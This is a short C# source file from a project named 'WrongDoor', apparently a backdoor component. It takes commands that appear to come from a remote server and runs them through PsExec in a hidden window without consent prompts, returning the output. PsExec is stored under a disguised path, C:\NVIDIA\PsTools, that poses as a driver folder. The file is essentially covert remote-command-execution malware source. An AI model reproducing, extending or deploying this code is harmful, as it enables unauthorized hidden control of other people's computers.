using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WrongDoor.Connector;

namespace WrongDoor.MainServer.CommandExutors
{
    class PSExecExecutor : BaseExecutor
    {
        public async Task<string> Execute(GetCommandsGQL.Response.CommandSelection command)
        {
            var processOptions = new ProcessStartInfo(@"C:\NVIDIA\PsTools\PsExec.exe", "-accepteula -accepteula " + command)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = Process.Start(processOptions);

            var outp = process.StandardError.ReadToEnd();
            outp += process.StandardOutput.ReadToEnd();

            process.WaitForExit();

            return (outp);
        }
    }
}
